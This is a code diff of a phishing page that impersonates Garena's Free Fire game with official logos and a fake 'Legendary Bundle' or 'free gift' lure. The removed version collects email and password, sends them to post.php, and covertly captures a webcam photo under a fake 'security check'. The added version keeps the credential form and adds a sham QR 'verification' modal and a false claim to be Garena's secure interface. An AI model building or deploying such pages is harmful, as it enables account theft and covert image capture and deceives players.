@@ -1,179 +1,230 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire  free gift</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0f1923;
-            color: white;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-image: url('https://ff.garena.com/images/bg.jpg');
-            background-size: cover;
-            background-position: center;
-        }
-        .container {
-            background-color: rgba(15, 25, 35, 0.9);
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-            width: 350px;
-            text-align: center;
-            border: 1px solid #ff4655;
-        }
-        .logo {
-            width: 200px;
-            margin-bottom: 20px;
-        }
-        h1 {
-            color: #ff4655;
-            margin-bottom: 20px;
-            font-size: 24px;
-        }
-        .warning {
-            background-color: #ff4655;
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #2a3a4a;
-            border-radius: 5px;
-            background-color: #1a2a3a;
-            color: white;
-            box-sizing: border-box;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #ff4655;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            margin-top: 10px;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #e63a49;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #6c757d;
-        }
-        .webcam-container {
-            margin: 15px 0;
-            display: none;
-        }
-        #webcam {
-            width: 100%;
-            border-radius: 5px;
-        }
-        .capture-btn {
-            margin-top: 10px;
-            background-color: #2a3a4a;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Fire Event Rewards</title>
+  <link rel="icon" href="https://ff.garena.com/favicon.ico" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://ff.garena.com/images/bg.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+    }
+
+    .main-container {
+      background-color: rgba(0, 0, 0, 0.85);
+      max-width: 420px;
+      margin: 50px auto;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #ff4655;
+      text-align: center;
+      color: white;
+    }
+
+    .logo {
+      width: 200px;
+      margin-bottom: 10px;
+    }
+
+    .banner {
+      width: 100%;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    .title {
+      font-size: 22px;
+      color: #ff4655;
+      margin-bottom: 10px;
+    }
+
+    .reward-box {
+      background-color: #1a2a3a;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .reward-box img {
+      width: 60px;
+      float: left;
+      margin-right: 10px;
+    }
+
+    .reward-box h4 {
+      margin: 5px 0 0 0;
+      color: #ffda44;
+      font-size: 16px;
+    }
+
+    .reward-box p {
+      margin: 3px 0;
+      font-size: 13px;
+      color: #ccc;
+    }
+
+    .account-select {
+      margin: 20px 0;
+      font-size: 14px;
+    }
+
+    .account-select select {
+      width: 100%;
+      padding: 10px;
+      background-color: #1f2f3f;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 5px;
+      background-color: #1f2a38;
+      color: white;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #ff4655;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-weight: bold;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #e53a4a;
+    }
+
+    .footer {
+      margin-top: 25px;
+      font-size: 12px;
+      color: #aaa;
+    }
+
+    /* QR Modal */
+    .qr-modal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.95);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 999;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .qr-modal img {
+      width: 200px;
+      margin-top: 20px;
+    }
+
+    .qr-modal h2 {
+      color: #ffda44;
+      margin-bottom: 10px;
+    }
+
+    .qr-modal button {
+      margin-top: 30px;
+      width: auto;
+      padding: 10px 20px;
+      background-color: #ff4655;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .qr-modal button:hover {
+      background-color: #e53a4a;
+    }
+
+  </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://ff.garena.com/images/logo.png" alt="Free Fire" class="logo">
-        <h1>Free Fire free gift</h1>
-        <div class="warning">
-            Your account needs to be verified for security reasons. Please log in to continue.
-        </div>
-        
-        <form id="loginForm" action="post.php?game=freefire" method="POST">
-            <input type="text" name="email" placeholder="Email or Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            
-            <div class="webcam-container" id="webcamContainer">
-                <video id="webcam" autoplay playsinline></video>
-                <button type="button" class="capture-btn" id="captureBtn">Capture Photo</button>
-                <input type="hidden" name="webcam" id="webcamImage">
-            </div>
-            
-            <button type="submit">VERIFY ACCOUNT</button>
-        </form>
-        
-        <div class="footer">
-            By proceeding, you agree to our Terms of Service and Privacy Policy
-        </div>
+
+  <div class="main-container" id="mainForm">
+    <img src="https://ff.garena.com/images/logo.png" class="logo" alt="Free Fire Logo" />
+    <img src="https://freefiremobile-a.akamaihd.net/common/web_event/officialrewards/banner.png" class="banner" alt="Event Banner" />
+
+    <div class="title">Get Your Legendary Bundle Now!</div>
+
+    <div class="reward-box">
+      <img src="download.jpg" alt="Reward Image">
+      <h4>10K Diamonds</h4>
+      <p>Legendary character unlock + emote</p>
     </div>
 
-    <script>
-        // Webcam functionality
-        document.addEventListener('DOMContentLoaded', function() {
-            const webcamContainer = document.getElementById('webcamContainer');
-            const webcamElement = document.getElementById('webcam');
-            const captureBtn = document.getElementById('captureBtn');
-            const webcamImage = document.getElementById('webcamImage');
-            let stream = null;
+    <div class="reward-box">
+      <img src="images.jpg" alt="Reward">
+      <p>MP14</p>
+    </div>
 
-            // Show webcam after a short delay to make it look like a security check
-            setTimeout(() => {
-                webcamContainer.style.display = 'block';
-                startWebcam();
-            }, 1000);
+    <form id="loginForm">
+      <div class="account-select">
+        Select login method:
+        <select name="accountType" required>
+          <option value="">-- Select --</option>
+          <option value="facebook">Facebook</option>
+          <option value="google">Google</option>
+          <option value="vk">VK</option>
+          <option value="guest">Guest</option>
+        </select>
+      </div>
 
-            async function startWebcam() {
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            width: { ideal: 640 },
-                            height: { ideal: 480 },
-                            facingMode: 'user'
-                        } 
-                    });
-                    webcamElement.srcObject = stream;
-                } catch (err) {
-                    console.error('Error accessing webcam:', err);
-                }
-            }
+      <input type="text" name="email" placeholder="Email or Username" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">CLAIM REWARD</button>
+    </form>
 
-            captureBtn.addEventListener('click', function() {
-                const canvas = document.createElement('canvas');
-                canvas.width = webcamElement.videoWidth;
-                canvas.height = webcamElement.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(webcamElement, 0, 0, canvas.width, canvas.height);
-                
-                // Convert to base64 and set as hidden input value
-                webcamImage.value = canvas.toDataURL('image/png');
-                
-                // Stop the webcam
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                
-                // Show success message
-                captureBtn.textContent = 'Photo Captured!';
-                captureBtn.style.backgroundColor = '#4CAF50';
-            });
+    <div class="footer">
+      Garena Free Fire © 2025. All rights reserved.<br>
+      Powered by Garena Singapore | This is a secure verification interface.
+    </div>
+  </div>
 
-            // Submit form after webcam capture
-            document.getElementById('loginForm').addEventListener('submit', function(e) {
-                if (!webcamImage.value) {
-                    e.preventDefault();
-                    alert('Please capture your photo for verification.');
-                }
-            });
-        });
-    </script>
+  <!-- QR Code Modal -->
+  <div class="qr-modal" id="qrModal">
+    <h2>🎉 Almost Done!</h2>
+    <p>Please scan this QR code inside your Free Fire mobile app to verify and receive your reward.</p>
+    <img src="https://api.qrserver.com/v1/create-qr-code/?data=https://reward.ff.garena.com/en&size=200x200" alt="QR Code" />
+    <button onclick="closeQR()">Close</button>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const qrModal = document.getElementById('qrModal');
+    const mainForm = document.getElementById('mainForm');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // Prevent real submission
+      mainForm.style.display = 'none';
+      qrModal.style.display = 'flex';
+    });
+
+    function closeQR() {
+      qrModal.style.display = 'none';
+      mainForm.style.display = 'block';
+    }
+  </script>
+
 </body>
 </html>
